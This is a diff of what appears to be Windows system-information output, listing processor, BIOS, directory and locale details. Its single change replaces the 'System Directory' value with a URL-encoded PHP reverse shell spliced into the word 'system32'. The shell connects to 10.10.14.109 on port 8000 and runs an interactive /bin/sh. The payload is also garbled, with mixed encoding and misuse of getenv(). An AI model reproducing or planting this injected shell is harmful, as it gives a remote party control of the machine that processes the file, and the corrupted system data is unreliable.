@@ -186,7 +186,7 @@ Processor(s):              2 Processor(s) Installed.
                            [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
 BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
 Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
+System Directory:          C:\Windows\sysphp%2520-r%2520%27%24sock%3dfsockopen%28getenv%28%252210%2e10%2e14%2e109%2522%29%2cgetenv%28%25228000%2522%29%29%3bexec%28%2522%2fbin%2fsh%2520-i%2520%253C%263%2520%253E%263%25202%253E%263%2522%29%3b%27tem32
 Boot Device:               \Device\HarddiskVolume1
 System Locale:             en-gb;English (United Kingdom)
 Input Locale:              en-gb;English (United Kingdom)
